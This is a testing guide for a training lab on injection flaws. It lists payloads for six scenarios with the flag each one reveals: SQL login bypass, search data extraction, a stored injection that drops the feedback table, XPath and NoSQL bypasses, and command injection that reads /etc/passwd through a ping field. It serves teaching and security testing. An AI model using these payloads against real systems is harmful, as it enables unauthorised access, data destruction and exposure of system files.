OWASP LAB-A03 – Testing Guide

## Objective

This guide assists testers in identifying and exploiting injection vulnerabilities within the lab environment, ensuring that each successful exploit reveals the corresponding flag.

## General Testing Steps

1. **Access the Application**: Navigate to the lab's homepage.
2. **Navigate to Test Modules**: Use the provided links to access different vulnerability scenarios.
3. **Input Malicious Payloads**: Enter crafted inputs to test for vulnerabilities.
4. **Observe Application Behavior**: Monitor responses, error messages, or unexpected behaviors.[coursera.org](https://www.coursera.org/articles/penetration-testing-plan?utm_source=chatgpt.com)
5. **Verify Flag Display**: Upon successful exploitation, a flag should be displayed on the page.

## Vulnerability Scenarios & Test Cases

### 1. **SQL Injection – Login Bypass**

- **Location**: `/login`
    
- **Test Input**:
    
```
**Username**: ' OR 1=1--
```

```
**Password**: anyvalue
```

 **Expected Outcome**: Access to the dashboard with the display of `FLAG{sql_login_bypass}`.
    
### 2. **SQL Injection – Data Extraction**

- **Location**: `/search`
    
- **Test Input**: 
```
' OR 1=1--'
```
    
- **Expected Outcome**: Display of multiple employee records and `FLAG{employee_info_extracted}`.

### 3. **Stored SQL Injection**

- **Location**: `/feedback`
    
- **Test Input**: 
```
Nice app'); DROP TABLE feedback;--
```

- **Expected Outcome**: Error indicating the `feedback` table no longer exists and display of `FLAG{stored_sql_executed}`.

### 4. **XPath Injection**

- **Location**: `/lookup`
    
- **Test Input**: 
```
admin" or "1"="1
```
    
- **Expected Outcome**: Successful login and display of `FLAG{xpath_bypass}`.

### 5. **NoSQL Injection**

- **Location**: `/usersearch`
    
- **Test Input**: 
```
{ "$ne": null }
```
    
- **Expected Outcome**: Display of user list and `FLAG{nosql_enum}`.

### 6. **Command Injection**

- **Location**: `/ping`
    
- **Test Input**: 
```
127.0.0.1
; cat /etc/passwd
;id
```
    
- **Expected Outcome**: Display of system file contents and `FLAG{command_exec_pwd}`.

## Post-Exploitation

- Ensure that each exploited vulnerability results in the display of its corresponding flag.
- If a flag is not displayed, review the input and application response for potential issues.
- After testing, reset the lab environment to its initial state to ensure consistent results for subsequent tests.

This guide provides a structured approach to testing injection vulnerabilities within your OWASP A03 Lab.